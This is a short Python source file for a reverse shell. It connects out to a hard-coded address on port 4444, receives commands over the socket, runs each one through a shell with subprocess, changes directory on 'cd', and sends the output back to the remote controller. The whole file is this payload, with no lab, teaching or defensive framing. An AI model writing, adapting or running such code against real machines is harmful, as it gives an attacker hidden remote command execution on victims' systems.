import socket
import json
import subprocess
import os


def send_command(command):
	command_dump = json.dumps(command)
	soc.send(command_dump.encode())

def get_command():
	output = soc.recv(1024).decode()
	return json.loads(output)


def runcommands():
	while True:
		command = get_command()
		if command == '':
			break
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		else:
			run_proccess = subprocess.Popen(command,shell=True,stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
			command_output = run_proccess.stdout.read() + run_proccess.stderr.read()
			send_command(command_output.decode())



def establishconnection():
	while True:
		soc.connect(("10.0.0.171",4444))
		runcommands()
		soc.close()



soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
establishconnection()

